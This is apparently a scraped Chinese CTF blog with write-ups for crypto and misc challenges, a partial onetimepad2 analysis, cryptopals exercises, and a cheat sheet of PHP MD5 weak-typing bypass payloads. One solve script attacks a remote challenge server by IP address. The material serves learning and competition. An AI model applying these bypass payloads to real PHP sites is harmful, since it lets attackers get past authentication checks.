123456789101112131415161718192021filename = &#123; &#x27;fi&#x27;: &#x27;first_one&#x27;, &#x27;fu&#x27;: &#x27;funny_one&#x27;, &#x27;la&#x27;: &#x27;last!_one&#x27;, &#x27;sm&#x27;: &#x27;smart_one&#x27;, &#x27;cu&#x27;: &#x27;cute__one&#x27;&#125;files = &#123;&#125;for i in filename: with open(filename[i], &#x27;rb&#x27;) as f: files[i] = f.read()# file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;la&#x27;]# file =files[&#x27;fi&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]# file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;la&#x27;]# file =files[&#x27;fi&#x27;]+files[&#x27;sm&#x27;]+files[&#x27;cu&#x27;]+files[&#x27;fu&#x27;]+files[&#x27;la&#x27;]file = files[&#x27;fi&#x27;] + files[&#x27;cu&#x27;] + files[&#x27;sm&#x27;] + files[&#x27;fu&#x27;] + files[&#x27;la&#x27;]with open(&#x27;out.zip&#x27;, &#x27;wb&#x27;) as f: f.write(file) 尝试到第五个的时候压缩包就能正常的解压了.解压出来一个flag文件, winhex打开发现文件头是jpg的文件头.后缀改成jpg后打开 Crypto 最喜欢的密码学! 这次想着要做完密码的, 可惜最后一道题没有做出来. 有趣的加密太难了, 附件只有一段像base的编码, 没什么思路….. 碰碰车这题感觉就像是proof_of_work…单纯的爆破md5直接上脚本把 1234567891011121314151617from hashlib import md5from string import printable&#x27;&#x27;&#x27;md5(AGVSCF?TZV?WBGVHC?U)=a8f738??????5ea5??????80865???af&#x27;&#x27;&#x27;STR1 = &#x27;AGVSCF&#x27;STR2 = &#x27;TZV&#x27;STR3 = &#x27;WBGVHC&#x27;STR4 = &#x27;U&#x27;for i in printable: for j in printable: for k in printable: STR = STR1 + i + STR2 + j + STR3 + k + STR4 if md5(STR.encode()).hexdigest().startswith(&#x27;a8f738&#x27;): print(STR, md5(STR.encode()).hexdigest()) 得到结果a8f738a65b715ea54900b180865b20af EasyRSA这题也很简单. 运算一下就可以得到N和phi了(太白给了呀然后正常解rsa就行了脚本如下 123456789101112131415from gmpy2 import invertfrom Crypto.Util.number import long_to_bytespandq = 20029167198807103822294848708534176719693827885584335928109682356494141073775700355124993345488062063358756812142730873692437534641839672970148348433433440p2andq2 = 208680638196054793779950396947640995086963335225314494211048436767328157403385847902708950876722819363430805183637917486948883719184952031896287718282687710627112461479842558330512185988841693609451411485248346255881435015800175737788918607504412656254312427601603342579907641505150315471704698521905016530338e = 65537c = 91507581287268678382704102499829526115486105502321675954617344102253738157075000438078155655317661988277710347178352070963528948558320623410799852584156693215831487103699955781123962661928296191496664400110250226880815518273669335738236882265242192523589233915770596106654695524214247405913652100286077779879n = (pandq ** 2 - p2andq2) // 2phi = n - pandq + 1d = invert(e, phi)print(long_to_bytes(pow(c, d, n))) 输出就是flag了 Go home这题太迷啦…到现在都还没懂出题人的意思.给出的题目是这样的 123n=0xc3d945bc033ff7dd932ba62d8ef506cb37f5fe8e45abdac07660c7ac2af97d3ce723710384046c1bd967e92b0e03666d7c0bcbd4043b39ee128e5a1c98b5367044a4e72a4868fdc4824e8f0f3074da2857a414c9dfd7bf208d41caefeac144a45a6ca225975b0fced05d85d6e95dc7c2fa303c8a69185b75b8b3fd7f3fe0b9b5p = 0xdfe9dd9c9e9987e2fdb230fb346cefa87893afed5d1b4240872ec5b2dfc3b397ecbbf9b54ae6e9b7be150cdc79de1e87d2d674352b857ae4e000000000000000c=0xe1ea04df467b48a7fa372d9374959571a084341041ec71f57e661cedfb517dbf1cc05a305edeb56ce0d2e29a98790a1cd538b31203a8ff7ea79aee1b3ad8629eac19607dce66f9138e3b376a8e915e24d209a23cb8e1a02c6030d840ceb4203 一开始拿到题的时候, 确实是没想到这里给的p是p的高位. 知道的话就懂是coppersmith了.所以一开始拿到题是去分解n来着, yafu也确实分出p跟q来了(跟出题人聊了下预期解应该是用coppersmith的因为题目也没给公钥e, 所以试着去爆破了一下e, 然而也没爆出结果.(事实上应该是有结果的, 当e=3的时候肯定能得出结果, 但因为过滤是利用字符串ctf{, 所以没有爆出结果来. 于是就卡住了… 因为p很奇怪(没想到这个是p的高位, 导致我觉得c和p调换过来了. 想看看c是否是素数, 扔进 www.factordb.com 出来了一个意想不到的结果啊这…三次方???于是试着对c开三次方根, 然后转成字符串. 确实得到了在可打印字符范围内的一段字符串 1ardyPq2]2lb]A_1q_p]_p1]qm]dsllw&#123; ctf,ard ctf,ard ctf,ard对应字母都是位移2位的!扔进工具里位移回来就得到(所以最后还是想吐槽一下, 能做出这题真的运气max了. block cipher连上远程查看源码, 发现明明是个hill密码!(名字却叫分组密码(狗头很显然加密就是将pad之后的明文分为每16个字节一组,构成4*4的矩阵,每组都和密钥矩阵做模乘模数为256. 所以只需要构造一个在mod256意义下存在逆矩阵的矩阵, 将这个加密后只需要乘上它的逆矩阵就可以得到密钥矩阵了.再求出密钥矩阵的逆矩阵, 就得对密文进行解密. 对于求模256逆矩阵, 只不过是在原先求逆矩阵的基础上将所有的运算改成模256的意义下进行就行了. 为了节省时间, 在网上找到了一个现成的求模逆矩阵的脚本, 然后再修改了一些细节. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121from gmpy2 import gcdimport numpy as np # 计算行列式的值class MyError(ValueError): pass# 检查矩阵格式是否合法以及是否可逆def check_matrix(A, M): if (not isinstance(A, list)) or (not isinstance(A[0], list)) or (not isinstance(A[0][0], int)): raise MyError(&#x27;Invalid matrix format.&#x27;) mat = np.array(A) D = int(np.linalg.det(A)) % M if gcd(D, M) &gt; 1: raise MyError(&#x27;This matrix does not have a modular inversion matrix.&#x27;)# 矩阵的第一类初等变换：交换矩阵第i行与第j行def swap(A, i, j): temp = A[j] A[j] = A[i] A[i] = temp# 矩阵的第二类初等变换：将矩阵第i行乘以ndef mul_n(A, i, n, M): a = A[i] A[i] = [a[x] * n % M for x in range(len(a))]# 矩阵的第三类初等变换：矩阵第i行减去n倍的j行def sub(A, i, j, n, M): a = A[i] b = A[j] A[i] = [(a[x] - n * b[x]) % M for x in range(len(a))]# 找到符合要求的第i行def find_row(A, i, M): start = i while A[start][i] == 0 or gcd(A[start][i], M) &gt; 1: start = start + 1 return start# 返回一个整数的模逆元素def mod_rev(num, mod): if (num == 0 or gcd(num, mod) &gt; 1): raise MyError(&#x27;modular inversion does not exists.&#x27;) else: i = 1 while i * num % mod != 1: i = i + 1 return idef disp(mat): print(&#x27;&#x27;) for i in range(len(mat)): for j in range(len(mat[i])): print(mat[i][j], end=&#x27;\\t&#x27;) print(&#x27;&#x27;) print(&#x27;&#x27;)def matrix_rev(A, M): try: check_matrix(A, M) dim = len(A) # concatenate with a unit matrix for i in range(dim): for j in range(dim): if j == i: A[i].append(1) else: A[i].append(0) # transform for i in range(dim): target_row = find_row(A, i, M) swap(A, i, target_row) n = mod_rev(A[i][i], M) mul_n(A, i, n, M) for j in range(dim): if j != i: sub(A, j, i, A[j][i], M) # get result A_rev = [A[i][dim:] for i in range(dim)] return A_rev except Exception as e: print(e)A = [[42, 42, 42, 43], [42, 42, 41, 44], [42, 41, 42, 42], [41, 42, 42, 42]] # 发送过去的明文的矩阵形式M = 256AINV = matrix_rev(A, M)# A = &#x27;***+**),*)**)***&#x27; 发送过去的明文encA = &#x27;6a9acfbf3dc3bf1265ea2e6a470404c1&#x27; # 所返回的密文enc_flag = &#x27;1017b9907716c35955305cbd50481660de262f48955ca48a6f97630d2cc7bb2e4f41b2a0bbce4c43575b234fff6455b0&#x27; # 加密之后的flagenc_A = np.array([int(encA[i:i + 2], 16) for i in range(0, len(encA), 2)]).reshape(4, 4)key = np.matmul(enc_A, AINV) % 256&#x27;&#x27;&#x27; 手动将key转成k的形式了&#x27;&#x27;&#x27;k = [[113, 213, 10, 58], [178, 139, 135, 13], [216, 204, 16, 149], [189, 0, 0, 189]]keyinv = np.array(matrix_rev(k, M))for i in range(0, len(enc_flag), 32): encflag = enc_flag[i:i + 32] enc_F = np.array([int(encflag[j:j + 2], 16) for j in range(0, len(encflag), 2)]).reshape(4, 4) f = np.matmul(keyinv, enc_F) % 256 f = f.reshape(16, ) for i in f: print(chr(i), end=&#x27;&#x27;) 得到flag:ctf{yes-sure-the-plain-is-blocked-right?} ant forest 这题居然只有两个人做真的…可能大家都觉得源码太长了不想看吧?我个人是感觉一点都不难的 题目的源码不贴了. 大概是在建一个默克尔树(这个默克尔树我也是第一次接触.网上找了张图, 就是从底部的叶子开始, 哈希之后两个两个为一组, 相加再哈希得到新的一层, 直到得到根节点. 而题目的要求就是输入两次叶子节点, 两次的输入不能相同但最后的树根是相同的.仔细想想其实并不难, 第二次生成树的叶子节点是第一次生成的树的其中一层就行了.(似乎是叫第二次原像攻击? 知道原理之后就开始写脚本了, 但是过程不太顺利, 因为python3太多数据类型了(转来转去实在是太鸡儿麻烦了… 所以决定用python2写脚本(确实该用py2写不然太乱了… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from hashlib import sha256from pwn import *import reprintable = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;def dohash(dat): return sha256(sha256(dat).digest()).digest()con = remote(&#x27;139.199.203.26&#x27;, 20002)def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256(start + END).hexdigest() if ensha == SHA: print(start) return startresp = con.recvuntil(&#x27;XXXX:&#x27;)END = re.findall(r&#x27;sha256\\(XXXX\\+(.*)\\)&#x27;, resp)[0]SHA = re.findall(r&#x27;== (.*)&#x27;, resp)[0]con.sendline(proof(END, SHA))con.recvuntil(&#x27;&gt;&#x27;)dic = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;]for _ in range(4): con.sendline(&#x27;1&#x27;) con.recv() con.send(dic[_]) con.recvuntil(&#x27;&gt;&#x27;)con.sendline(&#x27;2&#x27;)con.recvuntil(&#x27;&gt;&#x27;)con.sendline(&#x27;3&#x27;)a = dohash(&#x27;a&#x27;)b = dohash(&#x27;b&#x27;)c = dohash(&#x27;c&#x27;)d = dohash(&#x27;d&#x27;)ab = a + bcd = dohash(c + d).encode(&#x27;hex&#x27;)con.recvuntil(&#x27;:&#x27;)con.send(ab)con.recvuntil(&#x27;:&#x27;)con.send(&#x27;r&#x27;)con.recvuntil(&#x27;:&#x27;)con.send(cd)con.recvuntil(&#x27;:&#x27;)con.send(&#x27;k&#x27;)print con.recvuntil(&#x27;&#125;&#x27;) 最后得到!Not in leaves? Here is your reward: ctf{QUrfLwKFL8Fs3vZbAW4hPrRZFRZ11QosBYQr5jol} 总结这次HWB肝了4天半数学作业堆了好多…不过总的来说还是学到了很多新东西的(新东西都在wp详细写了, 所以有些地方详细有些地方简略.特别是web, 真的学到了很多新东西,也算是收获满满的Misc也是熟悉了很多套路吧不过学了挺久密码但是没有全部做出来太难受了…所以有趣的加密到底该怎么做… 大概就这些了,前面的大佬太强了, 根本打不过…继续加油吧哦对 文章里有错的地方请大佬务必提醒我!","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"Crypto - onetimepad2, understand the nature of the algorithm","date":"2020-10-29T16:35:09.000Z","path":"2020/10/30/Crypto-onetimepad2-understand-the-nature-of-the-algorithm/","text":"0ctf quals 2017的题, 是之前做过的onetimepad的升级版. 因为这道题涉及到了有限域下乘法, 矩阵乘法, 快速幂, 离散对数, 所以记录一下(学费了学费了… 题目源码先上代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/env python# coding=utf-8from os import urandomdef process1(m, k): res = 0 for i in bin(k)[2:]: res = res &lt;&lt; 1; if (int(i)): res = res ^ m if (res &gt;&gt; 128): res = res ^ P return resdef process2(a, b): res = [] res.append(process1(a[0], b[0]) ^ process1(a[1], b[2])) res.append(process1(a[0], b[1]) ^ process1(a[1], b[3])) res.append(process1(a[2], b[0]) ^ process1(a[3], b[2])) res.append(process1(a[2], b[1]) ^ process1(a[3], b[3])) return resdef nextrand(rand): global N, A, B tmp1 = [1, 0, 0, 1] tmp2 = [A, B, 0, 1] s = N N = process1(N, N) while s: if s % 2: tmp1 = process2(tmp2, tmp1) tmp2 = process2(tmp2, tmp2) s = s / 2 return process1(rand, tmp1[0]) ^ tmp1[1]def keygen(): key = str2num(urandom(16)) while True: yield key key = nextrand(key)def encrypt(message): length = len(message) pad = &#x27;\\x00&#x27; + urandom(15 - (length % 16)) to_encrypt = message + pad res = &#x27;&#x27; generator = keygen() f = open(&#x27;key.txt&#x27;, &#x27;w&#x27;) # This is used to decrypt and of course you won&#x27;t get it. for i, key in zip(range(0, length, 16), generator): f.write(hex(key)+&#x27;\\n&#x27;) res += num2str(str2num(to_encrypt[i:i+16]) ^ key) f.close() return resdef decrypt(ciphertxt): # TODO passdef str2num(s): return int(s.encode(&#x27;hex&#x27;), 16)def num2str(n, block=16): s = hex(n)[2:].strip(&#x27;L&#x27;) s = &#x27;0&#x27; * ((32-len(s)) % 32) + s return s.decode(&#x27;hex&#x27;)P = 0x100000000000000000000000000000087A = 0xc6a5777f4dc639d7d1a50d6521e79bfdB = 0x2e18716441db24baf79ff92393735345N = str2num(urandom(16))assert N != 0if __name__ == &#x27;__main__&#x27;: with open(&#x27;top_secret&#x27;) as f: top_secret = f.read().strip() assert len(top_secret) == 16 plain = &quot;One-Time Pad is used here. You won&#x27;t know that the flag is flag&#123;%s&#125;.&quot; % top_secret with open(&#x27;ciphertxt&#x27;, &#x27;w&#x27;) as f: f.write(encrypt(plain).encode(&#x27;hex&#x27;)+&#x27;\\n&#x27;) 整个流程挺简单的, 就是对palin加密. 但是里面的每个函数都挺有意思的. 下面一个一个来分析 process1(m,k)先看process1(m,k)很多时候这种看着就像在一个域里面做的计算, 可以随便几个小的数进去看看结果是什么. 如果是一些简单的操作比如加减乘除啥的一般很容易能看出来.而这个process1(m,k)就是在GF(2^128)下做m*k. 可以理解为就是一个乘法吧. 为什么是个乘法呢?平时纸上算乘法的时候都要用到竖式, 而这里的算法就是一个先计算高位的竖式.从最高位开始一位一位往下乘.(这个用纸上写出来会好理解吧, 这里就不写了 process2(a,b)这个函数就是个矩阵的乘法, 输出的就是 矩阵a * 矩阵b. 怎么看出来?经验? 一般遇到这种两个矩阵(数列)特定下标在进行加和乘计算的, 把每个式子写出来, 看能不能写成两个矩阵之间的操作, 而这里就是一个矩阵的乘法 nextrand(rand)这个函数才是重点!!! 123456789101112def nextrand(rand): global N, A, B tmp1 = [1, 0, 0, 1] tmp2 = [A, B, 0, 1] s = N N = process1(N, N) while s: if s % 2: tmp1 = process2(tmp2, tmp1) tmp2 = process2(tmp2, tmp2) s = s / 2 return process1(rand, tmp1[0]) ^ tmp1[1] 看不懂的地方就是中间的循环结构, 不知道具体在干什么. 查了一下wp才知道, 这是个快速幂!!!没想到第一次接触快速幂是在密码的题目里… 快速幂简单说一下快速幂吧, 计算机计算一个数的高次幂(例如3^60^)的时候, 如果直接计算60个3相乘就会特别慢, 但是可以把 3^60^ 化成 9^30^, 这样就只需要乘30次了.继续算下去会发生一个问题 3^60^ = 9^30^ = 81^15^ 这里有个15次幂, 如果除以2就是7.5, 7.5次幂是没办法计算的. 所以这里有个操作, 就是81^15^ = 81^14^ * 81^1^, 然后继续对81^14^进行化简.所以最终的结果就是 1233^60 &#x3D; 9^30 &#x3D; 81^15 &#x3D; 81^14 * 81^1 &#x3D; 6561^7 + 81^1 &#x3D;....&#x3D; 43046721^3 * 43046721^1 * 6561^1 * 81^1&#x3D; 1853020188851841^1 * 43046721^1 * 6561^1 * 81^1 可以看到结果有个特点, 就是最后一定会化成多个数的一次幂的乘积.而什么时候能分出一次幂呢? 就是次幂为奇数的时候!!! 回到函数回到函数里, 结合上面说的快速幂的算法, 可以看出这个循环就是计算tmp1 = tmp2^s, 未完待续….","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"}]},{"title":"PHP Weak type about MD5","date":"2020-10-21T16:02:00.000Z","path":"2020/10/22/web-md5弱类型/","text":"主要就是对一些在PHP中MD5值判断的漏洞的积累吧(每次都要查payload很麻烦的 为了方便, 文章中的所有变量都不带$ 1. a != b and md5(a) == md5(b)用==来判断两个变量(这样写肯定会被学长骂的!!!, 怎么绕过呢?先给出两个字符串吧QNKCDZO 和 240610708 而这两个字符串的MD5值为 120e8304004519934940580242199033910e462097431906509019562988736854 PHP在处理哈希字符串时, 它把每一个以“0E”开头的哈希值都解释为0, 具体的原因呢是因为0e开头会被认为是科学计数法, e后面的数会被认为是次幂, 而不管0乘10的几次幂都是0. 所以如果两个不同的密码经过哈希以后, 其哈希值都是以“0E”开头的, 那么PHP将会认为他们相同, 都是0. 2. a !== b and md5(a) === md5(b)要通过这个判断, 要利用MD5不能处理数组这个漏洞, 就是说当a和b都是数组的时候, md5(a) === md5(b) 会判断为真. 至于怎么让a !== b, a[]=1;b[]=2就行了. 3. (string)a !== (string)b and md5(a) === md5(b)啊这…这个可以直接去找两个相等md5的字符串. 123$Param1=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;$Param2=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;#008ee33a9d58b51cfeb425b0959121c9 使用的时候记得直接添加到包里面去, 浏览器上输入是无效的","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"MD5","slug":"MD5","permalink":"http://tearsjin.github.io/tags/MD5/"}]},{"title":"cryptopals","date":"2020-10-10T07:51:07.000Z","path":"2020/10/10/cryptopals/","text":"开始学习cryptopals啦, 一题一题的做完它吧(也不知道能做多久… 目录 cryptopals 1.1 - Convert hex to base64 cryptopals 1.2 - Fixed XOR cryptopals 1.3 - Single-byte XOR cipher cryptopals 1.4 - Detect single-character XOR cryptopals 1.5 - Implement repeating-key XOR cryptopals 1.6 - Break repeating-key XOR cryptopals 1.7 - AES in ECB mode cryptopals 1.8 - Detect AES in ECB mode cryptopals 1.1 - Convert hex to base64challenge The string: 149276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d Should produce: 1SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t So go ahead and make that happen. You’ll need to use this code for the rest of the exercises. 大概就是手动写一个hex2base64的脚本吧 Base64写之前先去了解一下hex转base64的原理(wiki真不错Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于 $log _2 64=6$，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。 转换的时候，将3字节的数据，先后放入一个24位的缓冲区中，先来的字节占高位。数据不足3字节的话，于缓冲器中剩下的比特用0补足。每次取出6比特，按照其值选择 12ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F; 中的字符作为编码后的输出，直到全部输入数据转换完成。 若原数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。 脚本知道原理就好写脚本了 12345678910111213141516171819202122232425262728293031323334353637def padding(Hex): if len(Hex) % 6: return Hex + &#x27;0&#x27; * (6 - len(Hex) % 6) return Hexdef encodeb64(Hex): Hex = padding(Hex) output = &#x27;&#x27; for i in range(0, len(Hex), 6): buff = bin(int(Hex[i:i + 6], 16))[2:] buff = &#x27;0&#x27; * (24 - len(buff)) + buff for j in range(0, len(buff), 6): value = int(buff[j:j + 6], 2) if value == 0: output += &#x27;=&#x27; elif value &lt; 26: output += chr(value + 65) elif value &lt; 52: output += chr(value + 71) elif value &lt; 62: output += str(value - 52) elif value == 62: output += &#x27;+&#x27; else: output += &#x27;/&#x27; return outputdef main(): Hex = &#x27;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#x27; print(encodeb64(Hex))if __name__ == &#x27;__main__&#x27;: main() cryptopals 1.2 - Fixed XOR题目 Write a function that takes two equal-length buffers and produces their XOR combination. If your function works properly, then when you feed it the string: 11c0111001f010100061a024b53535009181c … after hex decoding, and when XOR’d against: 1686974207468652062756c6c277320657965 … should produce: 1746865206b696420646f6e277420706c6179 相同长度的十六进制的xor, 一位一位的xor就行了吧 脚本1234567891011121314def fixex_xor(Hex1, Hex2): res = &#x27;&#x27; for i, j in zip(Hex1, Hex2): res += hex(int(i, 16) ^ int(j, 16))[2:] return resdef main(): Hex1 = &#x27;1c0111001f010100061a024b53535009181c&#x27; Hex2 = &#x27;686974207468652062756c6c277320657965&#x27; print(fixex_xor(Hex1, Hex2))if __name__ == &#x27;__main__&#x27;: main() 还是比较简单的,后面就不一定了Orz cryptopals 1.3 - Single-byte XOR cipher 从这里开始难度突然就上升了 题目 The hex encoded string: 11b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736 … has been XOR’d against a single character. Find the key, decrypt the message. You can do this by hand. But don’t: write code to do it for you. How? Devise some method for “scoring” a piece of English plaintext. Character frequency is a good metric. Evaluate each output and choose the one with the best score. 说是一段文字被单个字符(8bit)异或加密了, 要找出这个字符然后输出明文, 密钥空间为$2^8$, 也不算多, 但是如何让程序找出唯一一个正确的字符? 提示上有提到可以利用解密后的字符串的”得分”. 查了一下, 在一个dalao的博客上找到的这个得分应该叫字符频率(dalao说wiki上有字符频率表, 但我没找到, 就连这个”得分”的相关内容都没找到), 但是还好他的博客里附带了一个字符频率的数组. 12345CHARACTER_FREQ = &#123; #字符频率表, 出现一次某字母的得分 &#x27;a&#x27;: 0.0651738, &#x27;b&#x27;: 0.0124248, &#x27;c&#x27;: 0.0217339, &#x27;d&#x27;: 0.0349835, &#x27;e&#x27;: 0.1041442, &#x27;f&#x27;: 0.0197881, &#x27;g&#x27;: 0.0158610, &#x27;h&#x27;: 0.0492888, &#x27;i&#x27;: 0.0558094, &#x27;j&#x27;: 0.0009033, &#x27;k&#x27;: 0.0050529, &#x27;l&#x27;: 0.0331490, &#x27;m&#x27;: 0.0202124, &#x27;n&#x27;: 0.0564513, &#x27;o&#x27;: 0.0596302, &#x27;p&#x27;: 0.0137645, &#x27;q&#x27;: 0.0008606, &#x27;r&#x27;: 0.0497563, &#x27;s&#x27;: 0.0515760, &#x27;t&#x27;: 0.0729357, &#x27;u&#x27;: 0.0225134, &#x27;v&#x27;: 0.0082903, &#x27;w&#x27;: 0.0171272, &#x27;x&#x27;: 0.0013692, &#x27;y&#x27;: 0.0145984, &#x27;z&#x27;: 0.0007836, &#x27; &#x27;: 0.1918182&#125; 通过这个字符频率表, 可以定量的分析每次解密结果的得分, 得分最高就代表最接近正常英文语句(或者说文章). 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950CHARACTER_FREQ = &#123; # 字符频率表, 出现一次某字母的得分 &#x27;a&#x27;: 0.0651738, &#x27;b&#x27;: 0.0124248, &#x27;c&#x27;: 0.0217339, &#x27;d&#x27;: 0.0349835, &#x27;e&#x27;: 0.1041442, &#x27;f&#x27;: 0.0197881, &#x27;g&#x27;: 0.0158610, &#x27;h&#x27;: 0.0492888, &#x27;i&#x27;: 0.0558094, &#x27;j&#x27;: 0.0009033, &#x27;k&#x27;: 0.0050529, &#x27;l&#x27;: 0.0331490, &#x27;m&#x27;: 0.0202124, &#x27;n&#x27;: 0.0564513, &#x27;o&#x27;: 0.0596302, &#x27;p&#x27;: 0.0137645, &#x27;q&#x27;: 0.0008606, &#x27;r&#x27;: 0.0497563, &#x27;s&#x27;: 0.0515760, &#x27;t&#x27;: 0.0729357, &#x27;u&#x27;: 0.0225134, &#x27;v&#x27;: 0.0082903, &#x27;w&#x27;: 0.0171272, &#x27;x&#x27;: 0.0013692, &#x27;y&#x27;: 0.0145984, &#x27;z&#x27;: 0.0007836, &#x27; &#x27;: 0.1918182&#125;from Set1.Fixed_XOR import fixed_xordef hex2text(Hex): h = Hex if len(h) % 2 == 1: t = &#x27;0&#x27; + h return &#x27;&#x27;.join([chr(int(b, 16)) for b in [h[i:i + 2] for i in range(0, len(h), 2)]])def keygen(LEN): for i in range(256): yield ((2 - len(hex(i)[2:])) * &#x27;0&#x27; + hex(i)[2:]) * (LEN // 2)def getscore(text): score = 0 for i in text: i = i.lower() if i in CHARACTER_FREQ: score += CHARACTER_FREQ[i] return scoredef attack(cipher): generator = keygen(len(cipher)) res = [] for i in generator: plain = hex2text(fixed_xor(cipher, i)) score = getscore(plain) res.append([plain, score, i]) return resdef main(): cipher = &#x27;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#x27; max = [0, -1] for i in attack(cipher): if max[1] &lt; i[1]: max = i print(max)if __name__ == &#x27;__main__&#x27;: main() 关于最后面的排序, 看了相关文章发现其实可以用sorted()函数 直接举例子, 简单易懂 对键排序123dict1=&#123;&#x27;a&#x27;:2,&#x27;e&#x27;:3,&#x27;f&#x27;:8,&#x27;d&#x27;:4&#125;list1= sorted(dict1.items(),key=lambda x:x[0])print(list1) 对值排序123dict1=&#123;&#x27;a&#x27;:2,&#x27;e&#x27;:3,&#x27;f&#x27;:8,&#x27;d&#x27;:4&#125;list1= sorted(dict1.items(),key=lambda x:x[1])print(list1) 借用大佬的代码, 其实attack函数可以写成12345678def attack(cipher): generator = keygen(len(cipher)) res = [] for i in generator: plain = hex2text(fixed_xor(cipher, i)) score = getscore(plain) res.append(&#123;&#x27;key&#x27;: key, &#x27;plaintext&#x27;: plaintext, &#x27;score&#x27;: score&#125;) return sorted(res, key = lambda c:c[&#x27;score&#x27;]) cryptopals 1.4 - Detect single-character XOR题目 One of the 60-character strings in this file has been encrypted by single-character XOR. Find it. (Your code from #3 should help.) 意思是说, 在那个文件里面的60个字符串里面, 有一个是被xor加密过后的(一开始读题还以为是60个都是被加密的), 让我们找到他并且解密出来. 其实跟1.3没什么区别, 只是从1组里面选得分最高的密钥变成先根据密钥选出1组里面最高分的, 再选出60个字符串里面最高分的那组. 脚本123456789101112131415161718from Single_byte_XOR_cipher import *def main(): cipher = &#x27;&#x27; res = [] with open(&#x27;4.txt&#x27;, &#x27;r&#x27;) as f: while True: cipher = f.readline()[:-1] if cipher == &#x27;&#x27;: break res.append(attack(cipher)[-1]) print(sorted(res, key=lambda x: x[&#x27;score&#x27;])[-1])if __name__ == &#x27;__main__&#x27;: main() cryptopals 1.5 - Implement repeating-key XOR题目 Here is the opening stanza of an important work of the English language: 12Burning &#39;em, if you ain&#39;t quick and nimbleI go crazy when I hear a cymbal Encrypt it, under the key “ICE”, using repeating-key XOR. In repeating-key XOR, you’ll sequentially apply each byte of the key; the first byte of plaintext will be XOR’d against I, the next C, the next E, then I again for the 4th byte, and so on. It should come out to: 120b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f Encrypt a bunch of stuff using your repeating-key XOR function. Encrypt your mail. Encrypt your password file. Your .sig file. Get a feel for it. I promise, we aren’t wasting your time with this. 题目升级了!!! 脚本写完脚本才发现他是要我加密, 而不是解密, 所以只好再写一个加密的了 解密123456789101112131415161718192021222324from Fixed_XOR import fixed_xorfrom Single_byte_XOR_cipher import hex2textdef keypadding(ciplen, key): return &#x27;&#x27;.join([key[i % len(key)] for i in range(ciplen)])def text2hex(text): return &#x27;&#x27;.join(hex(ord(i))[2:] for i in text)def main(): cipher = &#x27;0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272\\na282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f&#x27; key = &#x27;ICE&#x27; cipher = &#x27;&#x27;.join(cipher.split(&#x27;\\n&#x27;)) padkey = text2hex(keypadding(len(cipher), key)) res = hex2text(fixed_xor(cipher, padkey)) print(res)if __name__ == &#x27;__main__&#x27;: main() 加密1234567891011121314151617181920212223from Fixed_XOR import fixed_xordef keypadding(ciplen, key): return &#x27;&#x27;.join([key[i % len(key)] for i in range(ciplen)])def text2hex(text): return &#x27;&#x27;.join(hex(ord(i))[2:] for i in text)def main(): plain = &quot;Burning &#x27;em, if you ain&#x27;t quick and nimble I go 